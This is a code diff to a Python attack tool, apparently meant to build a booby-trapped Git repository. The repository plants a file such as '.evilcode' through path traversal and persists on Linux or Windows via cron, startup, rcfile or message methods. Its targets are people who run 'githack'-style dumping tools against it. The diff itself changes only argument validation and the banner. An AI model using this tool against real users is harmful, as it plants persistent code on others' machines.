@@ -144,25 +144,25 @@ def badRepoGenerator( username :str,outputDirName="test",
     #cleanFiles(evilPayloadBaseDir,evilPayloadLocation)
 
 
-def argcheck(obj):
-    try :
-        assert obj.os in ["linux","win"]
-        assert obj.method in ["cron","start","rcfile","msg"]
-    except AssertionError :
-        print("[-] args error")
-        exit(-2)
+# def argcheck(obj):
+#     try :
+#         assert obj.os in ["linux","win"]
+#         assert obj.method in ["cron","start","rcfile","msg"]
+#     except AssertionError :
+#         print("[-] args error")
+#         exit(-2)
 
 
 def main():
     praser = argparse.ArgumentParser()
     praser.add_argument("-D","--outputDirectoryName",help="your repo with contain in this directory default is test",default="test")
     praser.add_argument("-u","--user",help="target username")
-    praser.add_argument("-o","--os",help="os version [ win, linux ] default is linux",default="linux")
-    praser.add_argument("-m","--method",help="attack method [ cron, start, rcfile, msg ]",default="rcfile")
+    praser.add_argument("-o","--os",help="os version [ win, linux ] default is linux",default="linux",choices=["win","linux"])
+    praser.add_argument("-m","--method",help="attack method [ cron, start, rcfile, msg ]",default="rcfile",choices=["cron","start","rcfile","msg"])
     praser.add_argument("-B","--badfilename",help="badfile in cron mode name",default=".evilcode")
     praser.add_argument("-p","--atpath",help="bad file you want located at path such as ../../../ ")
     arg = praser.parse_args()
-    argcheck(arg)
+    # argcheck(arg)
     badRepoGenerator(username=arg.user,
                      outputDirName=arg.outputDirectoryName,
                      badfileName=arg.badfilename,
@@ -179,6 +179,8 @@ def banner():
             | |  _| | __|  _ \ / _ \ |_| |/ _` |/ __| |/ / _ \/ _` |
             | |_| | | |_| |_) |  __/  _  | (_| | (__|   <  __/ (_| |
              \____|_|\__|____/ \___|_| |_|\__,_|\___|_|\_\___|\__,_|
+                                                                        
+[?] create a repo which contains the file at parent dict and hack back the "githack" like tools
                                                                         ''')
     
     pass
